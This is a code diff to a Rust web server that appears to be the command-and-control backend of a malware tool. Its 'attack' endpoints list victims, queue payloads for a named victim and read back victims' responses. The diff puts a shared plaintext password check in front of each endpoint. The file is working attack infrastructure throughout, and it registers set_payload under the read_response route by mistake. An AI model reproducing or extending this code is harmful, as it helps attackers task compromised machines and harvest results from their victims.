@@ -17,7 +17,7 @@
 use actix_web::{web, HttpResponse, Responder};
 use serde::{Deserialize, Serialize};
 
-//use crate::errors::*;
+use crate::errors::*;
 use crate::AppData;
 
 pub mod routes {
@@ -49,16 +49,25 @@ pub struct Victim {
     pub name: String,
 }
 
+#[derive(Clone, Debug, Serialize, Deserialize)]
+pub struct Password {
+    pub password: String,
+}
+
 #[my_codegen::post(path = "crate::V1_API_ROUTES.attack.list_victims")]
 async fn list_victims(
     data: AppData,
-    //) -> ServiceResult<impl Responder> {
-) -> impl Responder {
-    let resp = sqlx::query_as!(Victim, "SELECT name FROM cic_victims")
-        .fetch_all(&data.db)
-        .await
-        .unwrap();
-    HttpResponse::Ok().json(resp)
+    payload: web::Json<Password>,
+) -> ServiceResult<impl Responder> {
+    if payload.password == crate::SETTINGS.password {
+        let resp = sqlx::query_as!(Victim, "SELECT name FROM cic_victims")
+            .fetch_all(&data.db)
+            .await
+            .unwrap();
+        Ok(HttpResponse::Ok().json(resp))
+    } else {
+        Err(ServiceError::WrongPassword)
+    }
 }
 
 #[derive(Clone, Debug, Serialize, Deserialize)]
@@ -66,6 +75,7 @@ pub struct Payload {
     pub victim: String,
     pub payload_type: String,
     pub payload: String,
+    pub password: String,
 }
 
 #[derive(Clone, Debug, Serialize, Deserialize)]
@@ -74,35 +84,45 @@ pub struct PayloadID {
 }
 
 #[my_codegen::post(path = "crate::V1_API_ROUTES.attack.read_response")]
-async fn set_payload(data: AppData, payload: web::Json<Payload>) -> impl Responder {
-    sqlx::query!(
-        "INSERT INTO cic_messages (victim_id, payload_type, payload)
+async fn set_payload(data: AppData, payload: web::Json<Payload>) -> ServiceResult<impl Responder> {
+    if payload.password == crate::SETTINGS.password {
+        sqlx::query!(
+            "INSERT INTO cic_messages (victim_id, payload_type, payload)
         VALUES 
             ((SELECT ID from cic_victims WHERE name = $1), $2, $3);",
-        &payload.victim,
-        &payload.payload_type,
-        &payload.payload,
-    )
-    .execute(&data.db)
-    .await
-    .unwrap();
+            &payload.victim,
+            &payload.payload_type,
+            &payload.payload,
+        )
+        .execute(&data.db)
+        .await
+        .unwrap();
 
-    let id = sqlx::query_as!(
-        PayloadID,
-        "SELECT id FROM cic_messages 
+        let id = sqlx::query_as!(
+            PayloadID,
+            "SELECT id FROM cic_messages 
         WHERE 
             victim_id = (SELECT ID from cic_victims WHERE name = $1)
         AND payload_type = $2
         AND payload = $3;",
-        &payload.victim,
-        &payload.payload_type,
-        &payload.payload,
-    )
-    .fetch_one(&data.db)
-    .await
-    .unwrap();
+            &payload.victim,
+            &payload.payload_type,
+            &payload.payload,
+        )
+        .fetch_one(&data.db)
+        .await
+        .unwrap();
 
-    HttpResponse::Ok().json(id)
+        Ok(HttpResponse::Ok().json(id))
+    } else {
+        Err(ServiceError::WrongPassword)
+    }
+}
+
+#[derive(Clone, Debug, Serialize, Deserialize)]
+pub struct ResponseReq {
+    pub id: i32,
+    pub password: String,
 }
 
 #[derive(Clone, Debug, Serialize, Deserialize)]
@@ -113,17 +133,20 @@ pub struct PayloadResponse {
 #[my_codegen::post(path = "crate::V1_API_ROUTES.attack.read_response")]
 async fn read_response(
     data: AppData,
-    payload: web::Json<PayloadID>,
-    //) -> ServiceResult<impl Responder> {
-) -> impl Responder {
-    let data = sqlx::query_as!(
-        PayloadResponse,
-        "SELECT response FROM cic_messages
+    payload: web::Json<ResponseReq>,
+) -> ServiceResult<impl Responder> {
+    if payload.password == crate::SETTINGS.password {
+        let data = sqlx::query_as!(
+            PayloadResponse,
+            "SELECT response FROM cic_messages
         WHERE id = $1;",
-        &payload.id,
-    )
-    .fetch_one(&data.db)
-    .await
-    .unwrap();
-    HttpResponse::Ok().json(data)
+            &payload.id,
+        )
+        .fetch_one(&data.db)
+        .await
+        .unwrap();
+        Ok(HttpResponse::Ok().json(data))
+    } else {
+        Err(ServiceError::WrongPassword)
+    }
 }
